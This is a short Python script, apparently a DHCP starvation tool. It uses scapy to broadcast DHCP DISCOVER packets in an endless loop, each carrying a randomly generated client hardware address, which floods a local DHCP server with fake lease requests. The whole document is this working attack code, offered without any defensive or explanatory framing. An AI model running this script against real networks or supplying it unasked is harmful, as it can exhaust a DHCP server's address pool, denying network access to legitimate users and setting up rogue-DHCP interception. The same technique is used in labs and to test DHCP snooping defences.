from scapy.all import *
from randmac import RandMac

while True:
    src_mac = bytes(str(RandMac()), 'utf-8')
    fam,hw = get_if_raw_hwaddr(conf.iface)
    dhcp_discover = Ether(src=hw, dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=src_mac)/DHCP(options=[("message-type","discover"),"end"])
    sendp(dhcp_discover)
    print("sent 1 packet")